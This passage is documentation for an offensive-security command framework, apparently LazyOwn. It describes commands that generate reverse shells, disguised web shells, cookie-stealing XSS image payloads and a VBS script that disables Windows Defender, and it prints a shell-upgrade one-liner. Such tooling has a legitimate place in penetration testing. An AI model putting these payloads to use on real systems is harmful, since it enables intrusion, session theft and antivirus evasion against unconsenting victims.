before running this method. - The script’s functionality depends on its
implementation in <code>modules/lazypwn.py</code>.</p>
<h2 id="fixel">fixel</h2>
<p>Fixes file permissions and line endings in the project
directories.</p>
<p>This function converts line endings from DOS/Windows format to Unix
format for all files in the project directories. This helps to ensure
consistent line endings and can prevent issues related to file format
mismatches.</p>
<p>Usage: fixel</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Converts line endings for all files in the current directory
(<code>*</code>).</li>
<li>Converts line endings for all files in the <code>modules</code>
directory (<code>modules/*</code>).</li>
<li>Converts line endings for all files in the
<code>modules/cgi-bin</code> directory
(<code>modules/cgi-bin/*</code>).</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Run the method to fix line endings in the
specified directories.</p>
<p>Dependencies: - The <code>dos2unix</code> command must be installed
and accessible from the command line.</p>
<p>Examples: 1. Run <code>do_fixel</code> to convert line endings for
all files in the project directories.</p>
<p>Note: - This method only fixes line endings and does not modify file
permissions. - Ensure that the <code>dos2unix</code> command is
installed and functioning correctly.</p>
<h2 id="smbserver">smbserver</h2>
<p>Sets up an SMB server using Impacket and creates an SCF file for SMB
share access.</p>
<p>This function configures an SMB server to serve files from the
<code>sessions</code> directory and generates an SCF file that points to
the SMB share. The SCF file can be used to create a shortcut to the SMB
share on a Windows system.</p>
<p>Usage: smbserver</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Checks if <code>lhost</code> is valid using the
<code>check_lhost</code> function.</li>
<li>Creates an SCF file (<code>sessions/file.scf</code>) with
configuration to access the SMB share.</li>
<li>Copies a curl command to the clipboard for downloading the SCF file
from the SMB share.</li>
<li>Starts an SMB server using Impacket to serve the
<code>sessions</code> directory.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure <code>lhost</code> is set to a valid IP
address or hostname. 2. Run the method to create the SCF file and start
the SMB server. 3. Use the copied curl command to download the SCF file
on the target system. 4. Ensure that <code>impacket-smbserver</code> is
installed and accessible from the command line.</p>
<p>Dependencies: - The <code>impacket-smbserver</code> tool must be
installed and accessible from the command line. - The
<code>check_lhost</code> function must validate the <code>lhost</code>
parameter.</p>
<p>Examples: 1. Run <code>do_smbserver</code> to set up the SMB server
and generate the SCF file. 2. Use the provided curl command to download
the SCF file on the target system.</p>
<p>Note: - The SCF file is used to create a shortcut to the SMB share
and should be accessible from the target system. - Ensure that the
<code>lhost</code> parameter is correctly set and that the SMB server is
properly configured.</p>
<h2 id="sqlmap">sqlmap</h2>
<p>Uses sqlmap to perform SQL injection testing on a given URL or
request file (you can get one with burpsuit or proxy command and
foxyproxy plugin for browser).</p>
<p>This function allows the execution of sqlmap commands with various
options, including testing URL endpoints, reading from request files,
and using sqlmap’s wizard mode for easy configuration.</p>
Usage: sqlmap req <request_file> <parameter> sqlmap req <request_file>
<parameter> <database> sqlmap req <request_file> <parameter> <database>
<table>
<p>sqlmap -wiz</p>
<p>:param line: Command parameters for sqlmap. :type line: str</p>
<ul>
<li><p>If <code>line</code> starts with <code>req</code>, it expects the
following formats:</p></li>
<li><p><code>req &lt;request_file&gt; &lt;parameter&gt;</code>: Tests
the specified parameter in the request file for SQL injection.</p></li>
<li><p><code>req &lt;request_file&gt; &lt;parameter&gt; &lt;database&gt;</code>:
Tests the specified parameter and attempts to dump tables from the
specified database.</p></li>
<li><p><code>req &lt;request_file&gt; &lt;parameter&gt; &lt;database&gt; &lt;table&gt;</code>:
Tests the specified parameter and attempts to dump data from the
specified table in the database.</p></li>
<li><p>If <code>line</code> starts with <code>-wiz</code>, it runs
sqlmap’s wizard mode for interactive configuration.</p></li>
<li><p>If <code>line</code> is empty, it uses the URL specified in
<code>self.params["url"]</code> to perform SQL injection testing with
sqlmap.</p></li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. If using <code>req</code>, provide a valid
request file and parameters. 2. Run sqlmap with the specified options
for SQL injection testing. 3. To use the wizard mode, execute
<code>sqlmap -wizard</code>. 4. For URL-based testing, ensure
<code>url</code> is set and run sqlmap with the URL.</p>
<p>Dependencies: - The <code>sqlmap</code> tool must be installed and
accessible from the command line. - The request file specified in
<code>req</code> should be located in the <code>sessions</code>
directory.</p>
<p>Examples: sqlmap req requests.txt id sqlmap req requests.txt id
database_name sqlmap req requests.txt id database_name table_name sqlmap
-wiz</p>
<p>Note: - Ensure the request file exists and is readable before running
sqlmap. - The URL must be set for URL-based testing. - The wizard mode
is useful for interactive configuration if you’re unsure about the
options.</p>
<h2 id="proxy">proxy</h2>
<p>Runs a small proxy server to modify HTTP requests on the fly.</p>
<p>This function starts the <code>lazyproxy.py</code> script, which acts
as a proxy server for intercepting and modifying HTTP requests. The
server listens on port 8888.</p>
<p>Usage: proxy</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Executes the <code>lazyproxy.py</code> script to
start the proxy server. 2. The proxy server will run and modify requests
as configured in the script.</p>
<p>Dependencies: - The <code>lazyproxy.py</code> script must be
available in the <code>modules</code> directory.</p>
<p>Example: proxy</p>
<p>Note: - Ensure that the <code>lazyproxy.py</code> script is correctly
configured before running. - The proxy server will be accessible at
<code>http://localhost:8888</code>. - To stop the proxy server,
terminate the running process manually.</p>
<h2 id="createwebshell">createwebshell</h2>
<p>Creates a web shell disguised as a <code>.jpg</code> file in the
<code>sessions</code> directory.</p>
<p>This function performs the following actions: 1. Runs a Python script
<code>lazycreate_webshell.py</code> to create a disguised web shell. 2.
Downloads a PHP web shell from a specified URL and saves it to the
<code>sessions</code> directory.</p>
<p>Usage: createwebshell</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Executes the <code>lazycreate_webshell.py</code>
script to create a web shell disguised as a <code>.jpg</code> file. 2.
Downloads a PHP web shell from the GitHub repository and saves it to
<code>sessions</code>.</p>
<p>Dependencies: - <code>wget</code> must be installed for downloading
the web shell. - The <code>lazycreate_webshell.py</code> script must be
available in the <code>modules</code> directory.</p>
<p>Example: createwebshell</p>
<p>Note: - Ensure that the <code>lazycreate_webshell.py</code> script is
correctly configured and accessible. - Verify the URL in the
<code>wget</code> command to ensure it points to a valid and safe web
shell.</p>
<h2 id="createrevshell">createrevshell</h2>
<p>Creates a bash reverse shell script in the <code>sessions</code>
directory with the specified <code>lhost</code> and <code>lport</code>
values.</p>
<p>This function performs the following actions: 1. Checks if
<code>lhost</code> and <code>lport</code> are set. If not, it prints an
error message and exits. 2. Creates a bash reverse shell script using
the provided <code>lhost</code> and <code>lport</code> values. 3. Saves
the script to <code>sessions/revshell.sh</code>. 4. Prints a message
with the <code>curl</code> command to download and execute the reverse
shell script. 5. Copies the <code>curl</code> command to the
clipboard.</p>
<p>Usage: createrevshell</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/revshell.sh</code> with the bash reverse shell script. 2.
Displays the command to download and execute the script via
<code>curl</code>. 3. Copies the <code>curl</code> command to the
clipboard for easy use.</p>
<p>Dependencies: - Bash must be installed on the target system. -
<code>xclip</code> must be installed for copying the command to the
clipboard.</p>
<p>Example: createrevshell</p>
<p>Note: - Ensure that <code>lhost</code> and <code>lport</code> are set
before running this command. - The script will listen for incoming
connections on the specified <code>lport</code> and connect back to
<code>lhost</code>. - Adjust the <code>lhost</code> and
<code>lport</code> as needed for your specific environment.</p>
<h2 id="createwinrevshell">createwinrevshell</h2>
<p>Creates a PowerShell reverse shell script in the
<code>sessions</code> directory with the specified <code>lhost</code>
and <code>lport</code> values.</p>
<p>This function performs the following actions: 1. Checks if
<code>lhost</code> and <code>lport</code> are set. If not, it prints an
error message and exits. 2. Creates a PowerShell reverse shell script
using the provided <code>lhost</code> and <code>lport</code> values. 3.
Saves the script to <code>sessions/revshell.ps1</code>. 4. Prints a
message with the command to download and execute the reverse shell
script via <code>curl</code>. 5. Copies the <code>curl</code> command to
the clipboard.</p>
<p>Usage: createwinrevshell</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/revshell.ps1</code> with the PowerShell reverse shell
script. 2. Displays the command to download and execute the script via
<code>curl</code>. 3. Copies the <code>curl</code> command to the
clipboard for easy use.</p>
<p>Dependencies: - PowerShell must be installed on the target system. -
<code>xclip</code> must be installed for copying the command to the
clipboard.</p>
<p>Example: createwinrevshell</p>
<p>Note: - Ensure that <code>lhost</code> and <code>lport</code> are set
before running this command. - The script will listen for incoming
connections on the specified <code>lport</code> and connect back to
<code>lhost</code>. - Adjust the <code>lhost</code> and
<code>lport</code> as needed for your specific environment.</p>
<h2 id="createhash">createhash</h2>
<p>Creates a <code>hash.txt</code> file in the <code>sessions</code>
directory with the specified hash value and analyzes it using
<code>Name-the-hash</code>.</p>
<p>This function performs the following actions: 1. Writes the provided
hash value to <code>sessions/hash.txt</code>. 2. Analyzes the hash value
using <code>Name-the-hash</code>.</p>
<p>Usage: createhash <hash></p>
<p>:param line: The hash value to be written to <code>hash.txt</code>
and analyzed. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/hash.txt</code> with the specified hash value. 2.
Analyzes the hash value using the <code>nth</code> command.</p>
<p>Dependencies: - <code>sessions/hash.txt</code> will be created in the
<code>sessions</code> directory. - <code>Name-the-hash</code> must be
installed and accessible via the command <code>nth</code>.</p>
<p>Example: createhash 5f4dcc3b5aa765d61d8327deb882cf99</p>
<p>Note: - Ensure the hash value is correct before running the analysis.
- The hash value should be provided as a single argument without extra
characters or spaces.</p>
<h2 id="createcredentials">createcredentials</h2>
<p>Creates a <code>credentials.txt</code> file in the
<code>sessions</code> directory with the specified username and
password.</p>
<p>This function performs the following actions: 1. Validates the input
line to ensure it contains a colon (<code>:</code>), indicating the
presence of both a username and password. 2. Writes the valid input to
<code>sessions/credentials.txt</code>.</p>
<p>Usage: createcredentials user:password</p>
<p>:param line: The input line containing the username and password in
the format <code>user:password</code>. :type line: str :returns:
None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/credentials.txt</code> with the specified username and
password.</p>
<p>Dependencies: - <code>sessions/credentials.txt</code> will be created
in the <code>sessions</code> directory.</p>
<p>Example: createcredentials
administrator:passwordadministrator123&amp;!</p>
<p>Note: - Ensure the input format is correct:
<code>user:password</code>. - The credentials should be properly
formatted with a colon separating the username and password.</p>
<h2 id="createcookie">createcookie</h2>
<p>Creates a <code>cookie.txt</code> file in the <code>sessions</code>
directory with the specified cookie value.</p>
<p>This function performs the following actions: 1. Extracts the cookie
value from the provided input line using a regular expression. 2. Writes
the extracted cookie value to <code>sessions/cookie.txt</code>.</p>
<p>Usage: createcookie cookie=user_data=valor_base64</p>
<p>:param line: The input line containing the cookie value in the format
<code>cookie=value</code>. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/cookie.txt</code> with the extracted cookie value.</p>
<p>Dependencies: - <code>sessions/cookie.txt</code> will be created in
the <code>sessions</code> directory.</p>
<p>Example: createcookie cookie=user_data=valor_base64</p>
<p>Note: - Ensure the input format is correct:
<code>cookie=value</code>. - The cookie value should be properly encoded
and formatted as needed.</p>
<h2 id="download_resources">download_resources</h2>
<p>Downloads resources into the <code>sessions</code> directory.</p>
<p>This function performs the following actions: 1. Changes to the
<code>sessions</code> directory and executes
<code>download_resources.sh</code> to download required resources.</p>
<p>Usage: download_resources</p>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: 1. Runs the <code>download_resources.sh</code>
script in the <code>sessions</code> directory to download necessary
resources.</p>
<p>Dependencies: - <code>download_resources.sh</code> must be present in
the <code>sessions</code> directory.</p>
<p>Example: download_resources</p>
<p>Note: - Ensure that the <code>download_resources.sh</code> script is
present in the <code>sessions</code> directory and is executable. -
After running this command, you can use the <code>www</code> command as
indicated by the printed message.</p>
<h2 id="download_exploit">download_exploit</h2>
<p>Downloads and sets up exploits in the
<code>external/.exploits/</code> directory and starts a web server to
serve the files.</p>
<p>This function performs the following actions: 1. Changes to the
<code>external</code> directory and executes
<code>install_external.sh</code> to install necessary components or
exploits. 2. Displays the IP addresses associated with network
interfaces and copies the IP address of <code>tun0</code> to the
clipboard. 3. Lists the contents of the <code>external/.exploit</code>
directory and starts a web server on port 8443 to serve the files in
that directory. 4. Prints a message indicating the server’s status and
the port it’s running on.</p>
<p>Usage: download_exploit</p>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: 1. Runs the <code>install_external.sh</code> script
to set up necessary components or exploits. 2. Displays network
interface IP addresses and copies the IP address of <code>tun0</code> to
the clipboard. 3. Lists the contents of <code>external/.exploit</code>
directory. 4. Starts a Python HTTP server on port 8443 in the
<code>external/.exploit</code> directory to serve files.</p>
<p>Dependencies: - <code>install_external.sh</code> must be present in
the <code>external</code> directory. - <code>xclip</code> must be
installed for clipboard operations. - Python 3 must be installed to run
the HTTP server.</p>
<p>Example: download_exploit</p>
<p>Note: - Ensure that the <code>install_external.sh</code> script is
correctly configured and present in the <code>external</code> directory.
- The HTTP server will be accessible on port 8443. - The function
assumes the presence of <code>external/.exploit</code> directory and
serves files from there.</p>
<h2 id="dirsearch">dirsearch</h2>
<p>Runs the <code>dirsearch</code> tool to perform directory and file
enumeration on a specified URL.</p>
<p>This function executes <code>dirsearch</code> to scan a given URL for
directories and files, while excluding specific HTTP status codes from
the results. If <code>dirsearch</code> is not installed, the function
will attempt to install it before running the scan.</p>
<p>Usage: dirsearch <url></p>
<p>:param line: Not used in this function. The URL is provided via the
<code>url</code> parameter. :type line: str :returns: None</p>
<p>Manual execution: 1. If <code>dirsearch</code> is present, the
command <code>dirsearch -u &lt;url&gt; -x 403,404,400</code> is
executed. 2. If <code>dirsearch</code> is not present, the function
installs <code>dirsearch</code> using
<code>sudo apt install dirsearch -y</code> and then runs the
command.</p>
<p>Dependencies: - <code>dirsearch</code> must be installed. If not
present, it will be installed using <code>sudo apt</code>. - Ensure the
URL is set via the <code>url</code> parameter before calling this
function.</p>
<p>Example: dirsearch http://example.com/</p>
<p>Note: - Ensure that the <code>url</code> parameter is set before
calling this function. - The <code>-x</code> option specifies HTTP
status codes to exclude from the results (e.g., 403, 404, 400). - The
function will attempt to install <code>dirsearch</code> if it is not
already installed.</p>
<h2 id="john2hash">john2hash</h2>
<p>Runs John the Ripper with a specified wordlist and options.</p>
<p>This function executes John the Ripper to crack hashes using the
specified wordlist and additional options. If no additional options are
provided, it will attempt to display cracked hashes.</p>
<p>Usage: john2hash <options></p>
<p>:param line: Optional arguments to be passed to John the Ripper
(e.g., <code>--format=Raw-SHA512</code>). If not provided, the function
will default to showing the cracked hashes. :type line: str :returns:
None</p>
<p>Manual execution: 1. If <code>line</code> is provided, the command
<code>sudo john sessions/hash.txt --wordlist=&lt;wordlist&gt; &lt;options&gt;</code>
is executed. 2. If <code>line</code> is not provided, the command
<code>sudo john sessions/hash.txt --wordlist=&lt;wordlist&gt;</code> is
executed to display the cracked hashes.</p>
<p>Dependencies: - John the Ripper must be installed and available in
the system’s PATH. - Ensure the wordlist file exists at the specified
path. - The <code>sessions/hash.txt</code> file must contain the hashes
to be cracked.</p>
<p>Example: john2hash –format=Raw-SHA512 # If <code>wordlist</code> is
set to <code>/usr/share/wordlists/rockyou.txt</code>, the command
executed will be
<code>sudo john sessions/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512</code>.</p>
<p>Note: - Ensure that the <code>wordlist</code> parameter is set before
calling this function. - Provide the necessary options as a string
argument (e.g., <code>--format=Raw-SHA512</code>) if needed. - If no
options are provided, the function defaults to showing the cracked
hashes.</p>
<h2 id="hashcat">hashcat</h2>
<p>Runs Hashcat with specified attack mode and hash type using a
wordlist.</p>
<p>This function executes the Hashcat tool with the specified mode and
wordlist file. The hash value to be cracked should be provided as an
argument.</p>
<p>Usage: hashcat <mode></p>
<p>:param line: The hash type or mode to be used with Hashcat (e.g., 0
for MD5). This is a required argument. :type line: str :returns:
None</p>
<p>Manual execution: 1. The command
<code>hashcat -a 0 -m &lt;mode&gt; &lt;hash&gt; &lt;wordlist&gt;</code>
is executed, where <code>&lt;mode&gt;</code> is the hash type,
<code>&lt;hash&gt;</code> is the hash to be cracked, and
<code>&lt;wordlist&gt;</code> is the path to the wordlist file.</p>
<p>Dependencies: - Hashcat must be installed and available in the
system’s PATH. - Ensure the wordlist file exists at the specified
path.</p>
<p>Example: hashcat 0 # If <code>wordlist</code> is set to
<code>/usr/share/wordlists/rockyou.txt</code> and <code>line</code> is
<code>0</code>, the command executed will be
<code>hashcat -a 0 -m 0 /usr/share/wordlists/rockyou.txt</code>.</p>
<p>Note: - Ensure that the <code>wordlist</code> parameter is set before
calling this function. - The hash to be cracked must be passed as an
argument when calling the function. - Replace <code>&lt;mode&gt;</code>
with the appropriate Hashcat mode number (e.g., <code>0</code> for MD5,
<code>1000</code> for NTLM).</p>
<h2 id="complete_hashcat">complete_hashcat</h2>
<p>Complete mode options and file paths for the sessions/hash.txt</p>
<h2 id="responder">responder</h2>
<p>Runs Responder on a specified network interface with elevated
privileges.</p>
<p>This function executes the Responder tool with <code>sudo</code> on
the network interface provided in the <code>device</code> parameter.</p>
<p>Usage: responder</p>
<p>:param line: This parameter is not used in the function but is
included for consistency with other command methods. :type line: str
:returns: None</p>
<p>Manual execution: 1. The command
<code>sudo responder -I &lt;device&gt;</code> is executed, where
<code>&lt;device&gt;</code> is the network interface specified by the
user.</p>
<p>Dependencies: - The function relies on <code>sudo</code> to run
Responder with root privileges. - Ensure that Responder is installed and
available in the system’s PATH.</p>
<p>Example: responder # If <code>device</code> is set to
<code>tun0</code>, the command executed will be
<code>sudo responder -I tun0</code>.</p>
<p>Note: - Ensure that the <code>device</code> parameter is set before
calling this function. - Replace <code>&lt;device&gt;</code> with the
appropriate network interface, such as <code>tun0</code>,
<code>eth0</code>, etc. - Running Responder requires root privileges, so
make sure the user running the command has the necessary
permissions.</p>
<h2 id="ip">ip</h2>
<p>Displays IP addresses of network interfaces and copies the IP address
from the <code>tun0</code> interface to the clipboard.</p>
<p>This function performs the following tasks: 1. Displays IP addresses
for all network interfaces using <code>ip a show scope global</code> and
<code>awk</code>. 2. Copies the IP address from the <code>tun0</code>
interface to the clipboard using <code>xclip</code>.</p>
<p>Usage: ip</p>
<p>:param line: This parameter is not used in the function but is
included for consistency with other command methods. :type line: str
:returns: None</p>
<p>Manual execution: 1. The command
<code>ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }'</code>
is executed to display the IP addresses of all network interfaces. 2.
The IP address of the <code>tun0</code> interface is copied to the
clipboard using the command
<code>ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip</code>.</p>
<p>Dependencies: - The function relies on <code>awk</code>,
<code>grep</code>, <code>cut</code>, and <code>xclip</code> to process
and copy the IP address.</p>
<p>Example: ip # This will display IP addresses for all network
interfaces and copy the IP address from <code>tun0</code> to the
clipboard.</p>
<p>Note: Ensure that the <code>tun0</code> interface exists and has an
IP address assigned. If <code>tun0</code> is not present or has no IP
address, the clipboard will not be updated.</p>
<h2 id="rhost">rhost</h2>
<p>Copies the remote host (rhost) to the clipboard and updates the
command prompt.</p>
<p>This function performs two tasks: 1. It copies the <code>rhost</code>
parameter to the clipboard if it is valid. 2. It updates the command
prompt to include the <code>rhost</code> and the current working
directory.</p>
<p>Usage: rhost [clean]</p>
<p>:param line: An optional argument that determines the behavior of the
function: - If ‘clean’, it resets the command prompt to its default
format. - If any other value, it updates the command prompt to include
the <code>rhost</code> and current working directory. :type line: str
:returns: None</p>
<p>Manual execution: 1. If <code>line</code> is ‘clean’: - The command
prompt is reset to its default format. 2. If <code>line</code> is any
other value: - The command prompt is updated to show the
<code>rhost</code> and the current working directory. - The
<code>rhost</code> is copied to the clipboard using
<code>xclip</code>.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
<code>rhost</code> to the clipboard.</p>
<p>Example: rhost # This will copy the current <code>rhost</code> to the
clipboard and update the prompt.</p>
<p>rhost clean # This will reset the command prompt to its default
format.</p>
<p>Note: Ensure that the <code>rhost</code> is valid by checking it with
the <code>check_rhost</code> function before copying it to the
clipboard.</p>
<h2 id="banner">banner</h2>
<p>Show the banner</p>
<h2 id="py3ttyup">py3ttyup</h2>
<p>Copies a Python reverse shell command to the clipboard.</p>
<p>This function generates a Python command that uses the
<code>pty</code> module to spawn a new shell and copies it to the
clipboard. This is typically used for creating a TTY shell in a reverse
shell situation.</p>
<p>Usage: py3ttyup</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. The function creates a Python command with
<code>pty.spawn</code> to open a shell. 2. The command is copied to the
clipboard using <code>xclip</code>. 3. A message is printed to inform
the user that the command has been copied.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
command to the clipboard.</p>
<p>Example: py3ttyup # This will copy the Python command
<code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to the
clipboard.</p>
<p>Note: This command is often used in scenarios where you need a more
interactive shell from a reverse shell connection.</p>
<h2 id="rev">rev</h2>
<p>Copies a reverse shell payload to the clipboard.</p>
<p>This function generates a reverse shell command that connects back to
the specified host and port, and copies it to the clipboard. It also
provides a way to execute the payload via a PHP-based web shell.</p>
<p>Usage: rev</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rhost</code> parameters are set. 2. The
function generates a reverse shell command in Bash and prints
instructions for using the payload. 3. It also provides an example URL
and PHP code snippet that decodes and executes the base64-encoded
payload. 4. The reverse shell command is copied to the clipboard using
<code>xclip</code>.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
command to the clipboard. - Base64 encoding is used to obfuscate the
payload.</p>
<p>Example: rev # This will copy a reverse shell command to the
clipboard and display instructions for its use.</p>
<h2 id="img2cookie">img2cookie</h2>
<p>Copies a malicious image tag payload to the clipboard.</p>
<p>This function crafts and copies two different image tag payloads
designed to steal cookies from a target’s browser. The payloads use
JavaScript to send cookies to a specified host and port. The user is
prompted to select which payload to copy to the clipboard.</p>
<p>Usage: img2cookie</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rhost</code> parameters are set. 2. The
function generates two payloads: - Payload 1: A script that sends
cookies to the specified host and port. - Payload 2: An image tag with
an <code>onerror</code> event that fetches cookies and sends them to the
specified host and port using Base64 encoding. 3. The user is prompted
to choose between the two payloads, which are then copied to the
clipboard.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
payloads to the clipboard. - Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rhost</code> parameters are set with
appropriate values.</p>
<p>Example: img2cookie # This will prompt you to select between two
payloads. The chosen payload will be copied to the clipboard.</p>
<h2 id="disableav">disableav</h2>
<p>Creates a Visual Basic Script (VBS) to attempt to disable antivirus
settings.</p>
<p>This function generates a VBS script designed to modify Windows
Registry settings and run PowerShell commands to disable various Windows
Defender antivirus features.</p>
<p>Usage: disableav</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. The function writes a VBS script to a file named
<code>aav.vbs</code> in the <code>sessions</code> directory. 2. The
script: - Elevates its privileges if not already running as an
administrator. - Modifies Windows Registry settings to disable various
Windows Defender features. - Outputs PowerShell commands to disable
additional Windows Defender settings.</p>
<p>The VBS script: - Uses <code>WScript.Shell</code> to modify the
Windows Registry for disabling Windows Defender. - Calls PowerShell
commands to further disable antivirus features.</p>
<p>Dependencies: - The script must be executed on a Windows system where
you have administrative privileges. - Ensure you have appropriate
permissions to modify Windows Registry settings.</p>
<p>Example: disableav # This will create the <code>aav.vbs</code> file
with the specified content in the <code>sessions</code> directory.</p>
<h2 id="conptyshell">conptyshell</h2>
<p>Downloads ConPtyShell and prepares a PowerShell command for remote
access.</p>
<p>This function downloads the ConPtyShell PowerShell script and ZIP
archive to the <code>sessions</code> directory and copies a PowerShell
command to the clipboard for easy execution.</p>
<p>Usage: conptyshell</p>
<p>:param line: This parameter is not used in the function. The required
host and port are retrieved from the <code>params</code> dictionary.
:type line: str :returns: None</p>
<p>Manual execution: 1. Ensure that the <code>lhost</code> and
<code>lport</code> parameters are set with the local host and port for
the reverse shell. 2. The function downloads
<code>Invoke-ConPtyShell.ps1</code> and <code>ConPtyShell.zip</code> to
the <code>sessions</code> directory. 3. Constructs a PowerShell command
to run <code>Invoke-ConPtyShell.ps1</code> with the specified local IP
and port. 4. Copies the constructed command to the clipboard using
<code>xclip</code>.</p>
<p>The constructed PowerShell command: - Uses
<code>Invoke-ConPtyShell.ps1</code> to establish a reverse shell
connection to the specified <code>lhost</code> and <code>lport</code>. -
Sets the PowerShell execution policy to bypass and specifies the
dimensions of the terminal window.</p>
<p>Dependencies: - <code>wget</code>: For downloading files from the
internet. - <code>xclip</code>: For copying commands to the clipboard. -
Ensure <code>ConPtyShell</code> script and ZIP are compatible with your
environment.</p>
<p>Example: conptyshell # This will download the required files and copy
the PowerShell command to the clipboard.</p>
<h2 id="pwncatcs">pwncatcs</h2>
<p>Runs <code>pwncat-cs</code> with the specified port for
listening.</p>
<p>This function starts a <code>pwncat-cs</code> listener on the
specified local port. It can use a port defined in the
<code>lport</code> parameter or a port provided as an argument.</p>
<p>Usage: pwncatcs <port></p>
<p>:param line: The port number to use for the <code>pwncat-cs</code>
listener. If not provided, it defaults to the <code>lport</code>
parameter. :type line: str :returns: None</p>
<p>Manual execution: 1. Ensure that <code>pwncat-cs</code> is installed
and accessible from your command line. 2. The port number can either be
provided as an argument or be set in the <code>lport</code> parameter of
the function. 3. Run the function to start <code>pwncat-cs</code> on the
specified port.</p>
<p>If no port is provided as an argument, the function will use the port
specified in the <code>lport</code> parameter. If a port is provided, it
overrides the <code>lport</code> value.</p>
<p>After starting the listener, the function prints a message indicating
that <code>pwncat-cs</code> is running on the specified port and another
message when the session is closed.</p>
<p>Dependencies: - <code>pwncat-cs</code>: A tool used for creating
reverse shells or bind shells.</p>
<h2 id="find">find</h2>
<p>Automates command execution based on a list of aliases and
commands.</p>
<ol type="1">
<li>Displays available aliases and their commands.</li>
<li>Asks the user if they want to execute a specific command.</li>
<li>If confirmed, displays the alias and command with a number.</li>
<li>Executes the command and copies it to the clipboard.</li>
</ol>
<p>:param line: The command line input containing the list of alias and
command pairs. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Prepare the list of alias and command pairs in the format: “alias
command”. - Provide this list as input to the function. - Confirm the
execution of the desired command when prompted. - Manually copy the
command to the clipboard if needed.</p>
<p>Note: Ensure <code>xclip</code> is installed and properly configured
to use clipboard functionalities.</p>
<h2 id="sh">sh</h2>
<p>execute some command direct in shell to avoid exit LazyOwn ;)</p>
<h2 id="pwd">pwd</h2>
<p>’echo -e “[`. It converts a single remote host into a list if
necessary, and then iterates over each host, performing the given
function with each host. After the operation, it restores the original
remote host value.</p>
<p>:param func: The function to be decorated and executed for each
remote host. :type func: function :return: The decorated function.
:rtype: function</p>
<h2 id="check_sudo">check_sudo</h2>
<p>Checks if the script is running with superuser (sudo) privileges, and
if not, restarts the script with sudo privileges.</p>
<p>This function verifies if the script is being executed with root
privileges by checking the effective user ID. If the script is not
running as root, it prints a warning message and restarts the script
using sudo.</p>
<p>:return: None</p>
<h2 id="activate_virtualenv">activate_virtualenv</h2>
<p>Activates a virtual environment and starts an interactive shell.</p>
<p>This function activates a virtual environment located at
<code>venv_path</code> and then launches an interactive bash shell with
the virtual environment activated.</p>
<p>:param venv_path: The path to the virtual environment directory.
:type venv_path: str :return: None</p>
<h2 id="parse_proc_net_file">parse_proc_net_file</h2>
<p>Internal function to parse a /proc/net file and extract network
ports.</p>
<p>This function reads a file specified by <code>file_path</code>,
processes each line to extract local addresses and ports, and converts
them from hexadecimal to decimal. The IP addresses are converted from
hexadecimal format to standard dot-decimal notation. The function
returns a list of tuples, each containing an IP address and a port
number.</p>
<p>:param file_path: The path to the /proc/net file to be parsed. :type
file_path: str :return: A list of tuples, each containing an IP address
and a port number. :rtype: list of tuple</p>
<h2 id="get_open_ports">get_open_ports</h2>
<p>Internal function to get open TCP and UDP ports on the operating
system.</p>
<p>This function uses the <code>parse_proc_net_file</code> function to
extract open TCP and UDP ports from the corresponding /proc/net files.
It returns two lists: one for TCP ports and one for UDP ports.</p>
<p>:return: A tuple containing two lists: the first list with open TCP
ports and the second list with open UDP ports. :rtype: tuple of (list of
tuple, list of tuple)</p>
<h2 id="find_credentials">find_credentials</h2>
<p>Searches for potential credentials in files within the specified
directory.</p>
<p>This function uses a regular expression to find possible credentials
such as passwords, secrets, API keys, and tokens in files within the
given directory. It iterates through all files in the directory and
prints any matches found.</p>
<p>:param directory: The directory to search for files containing
credentials. :type directory: str :return: None</p>
<h2 id="rotate_char">rotate_char</h2>
<p>Internal function to rotate characters for ROT cipher.</p>
<p>This function takes a character and a shift value, and rotates the
character by the specified shift amount. It only affects alphabetical
characters, leaving non-alphabetical characters unchanged.</p>
<p>:param c: The character to be rotated. :type c: str :param shift: The
number of positions to shift the character. :type shift: int :return:
The rotated character. :rtype: str</p>
<h2 id="get_network_info">get_network_info</h2>
<p>Retrieves network interface information with their associated IP
addresses.</p>
<p>This function executes a shell command to gather network interface
details, parses the output to extract interface names and their
corresponding IP addresses, and returns this information in a dictionary
format. The dictionary keys are interface names, and the values are IP
addresses.</p>
<p>:return: A dictionary where the keys are network interface names and
